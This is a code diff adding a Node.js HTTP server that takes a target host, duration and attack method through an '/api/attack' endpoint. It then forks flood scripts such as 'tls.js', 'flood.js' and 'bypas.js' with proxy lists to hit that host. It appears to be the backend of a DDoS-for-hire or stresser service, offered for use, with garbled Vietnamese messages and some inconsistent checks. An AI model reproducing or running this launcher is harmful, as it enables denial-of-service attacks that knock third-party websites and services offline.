@@ -1,0 +1,125 @@
+const http = require('http');
+const { fork } = require('child_process');
+const url = require('url');
+const port = 1111;
+let lastAPICallTime = Date.now();
+
+const runScript = (scriptName, args) => {
+  const childProcess = fork(scriptName, args);
+
+  childProcess.on('error', (err) => {
+    console.error(err);
+  });
+
+  childProcess.on('message', (message) => {
+    console.log(message);
+  });
+};
+
+const server = http.createServer((req, res) => {
+  const currentTime = Date.now();
+  const cooldown = 60 * 0;
+  const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+  const parsedUrl = url.parse(req.url, true);
+  const { key, host, time, method } = parsedUrl.query;
+  
+
+  if (!host || !port || !time || !method) {
+    const err_u = {
+      error: true,
+      message: 'Sai URL, URL c?n ph?i d?: /api/attack?host=[url]&port=[port]&method=[methods]&time=[time]',
+      code: 410
+    };
+
+    res.writeHead(400, { 'Content-Type': 'application/json' });
+    res.end(JSON.stringify(err_u));
+    return;
+  }
+
+  if (!port) {
+    const err_p = {
+      message: 'Thi?u port',
+      code: 404
+    };
+
+    res.writeHead(400, { 'Content-Type': 'application/json' });
+    res.end(JSON.stringify(err_p));
+    return;
+  }
+
+  if (time > 10000) {
+    const err_time = {
+      message: 'Th?i gian ph?i du?i 60s',
+      code: 400
+    };
+
+    res.writeHead(400, { 'Content-Type': 'application/json' });
+    res.end(JSON.stringify(err_time));
+    return;
+  }
+
+  if (!host) {
+    const err_host = {
+      message: 'Thi?u host',
+      code: 404
+    };
+
+    res.writeHead(400, { 'Content-Type': 'application/json' });
+    res.end(JSON.stringify(err_host));
+    return;
+  }
+
+  if (
+    !(
+      method.toLowerCase() === 'tls' ||
+      method.toLowerCase() === 'flood' ||
+      method.toLowerCase() === 'h2' ||
+      method.toLowerCase() === 'bypass' ||
+      method.toLowerCase() === 'basic' ||
+      method.toLowerCase() === 'captcha'
+    )
+  ) {
+    const err_method = {
+      err: true,
+      method_valid: 'Sai method',
+      code: 403
+    };
+
+    res.writeHead(400, { 'Content-Type': 'application/json' });
+    res.end(JSON.stringify(err_method));
+    return;
+  }
+
+  
+  const jsonData = {
+    status: 'Send attack successfully',
+    running: '1',
+    host: host,
+    time: time,
+    method: method,
+    code: 200
+  };
+
+  res.writeHead(200, { 'Content-Type': 'application/json' });
+  res.end(JSON.stringify(jsonData));
+
+  lastAPICallTime = currentTime;
+
+  if (method.toLowerCase() === 'tls') {
+    runScript('tls.js', [host, time, '35', '2', 'prx.txt']);
+  } else if (method.toLowerCase() === 'flood') {
+    runScript('flood.js', [host, time, '65', '6', 'vip.txt']);
+  } else if (method.toLowerCase() === 'bypass') {
+    runScript('bypas.js', [host, time, '65', '6', 'vip.txt']);
+  } else if (method.toLowerCase() === 'basic') {
+    runScript('z2.js', [host, time, '65', '5', 'vip.txt']);
+  } else if (method.toLowerCase() === 'h2') {
+    runScript('tls.js', [host, time, '65', '4', 'vip.txt']);
+  } else if (method.toLowerCase() === 'browser') {
+    runScript('http-galaxy.js', [host, '5', 'vip.txt', '65', time]);
+  }
+});
+
+server.listen(port, () => {
+  
+}); 
